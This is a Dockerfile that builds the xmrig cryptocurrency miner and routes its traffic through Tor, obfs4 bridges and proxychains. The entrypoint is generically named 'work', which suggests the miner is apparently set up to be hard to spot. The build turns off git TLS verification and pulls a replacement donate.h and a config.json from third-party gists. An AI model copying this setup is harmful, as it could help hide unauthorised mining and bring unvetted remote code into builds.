ARG VERSION=master
FROM alpine:latest

# Copy configuration files
COPY etc/dnsmasq.conf /etc/dnsmasq.conf
COPY etc/s6 /etc/s6
COPY etc/resolv.conf /etc/resolv.conf
COPY bin/work /usr/bin/work
COPY etc/proxychains/proxychains.conf /etc/proxychains/proxychains.conf 

# Setup environment
RUN mkdir /xmrig && \
    apk --no-cache upgrade && \
    apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        dnsmasq \
        s6 \
        upx \
        binutils \
        build-base \
        libmicrohttpd-dev \
        openssl-dev \
        tor \
        curl \
        go \
        torsocks \
        openrc \
        hwloc \
        hwloc-dev \
        proxychains-ng && \
    rc-update add s6 default

# Configure Tor DNS and permissions
RUN chmod 0755 /etc/s6/*/run /usr/bin/work

# Install obfs4proxy from GitLab (build from source)
RUN git clone https://gitlab.com/yawning/obfs4.git /obfs4 && \
    cd /obfs4 && \ 
    go build -o obfs4proxy/obfs4proxy ./obfs4proxy && \
    cp obfs4proxy/obfs4proxy /usr/local/bin && \
    chmod +x /usr/local/bin/obfs4proxy

# Clone and build xmrig
RUN git config --global http.sslVerify false && \
    git clone https://github.com/MoneroOcean/xmrig /xmrig && \
    cd /xmrig && \
    git fetch --tags && \
    git checkout ${VERSION} && \
    git submodule update --init --recursive && \
    rm src/donate.h && \
    wget https://gist.githubusercontent.com/dsomeone/138a503bbd9f4c41980e0668f2eed179/raw/876aaa119ea8c1769105129dc661a970b9c086a7/donate.h -P src/ && \
    mkdir build && \
    cd build && \
    wget https://gist.githubusercontent.com/WifeAiBot/32f60dd566575a08de2e89bf67033862/raw/01fbbf35d47ea8a93f949cda0dd4823d3b29119a/config.json && \
    cmake -DCMAKE_BUILD_TYPE=Release .. && \
    make -j4

# Clean up unnecessary files

# Remove build dependencies
RUN apk del --no-cache --purge \
        build-base \
        cmake \
        git \
        binutils && \
    rm -rf /var/cache/apk/*

# Modify Tor Configuration - Avoid read-only errors
RUN echo "DNSPort 9053" >> /etc/tor/torrc && \
    sed "1s/^/SocksPort 0.0.0.0:9050\n/" /etc/tor/torrc.sample > /etc/tor/torrc

# Expose the required port
EXPOSE 80

# Set the working directory
WORKDIR /xmrig/build

# Set the entrypoint to the entrypoint script
ENTRYPOINT ["/usr/bin/work"]

# Health check to verify Tor connectivity
HEALTHCHECK --interval=60s --timeout=15s --start-period=20s \
    CMD curl -s --socks5 127.0.0.1:9050 'https://check.torproject.org/' | grep -qm1 Congratulations
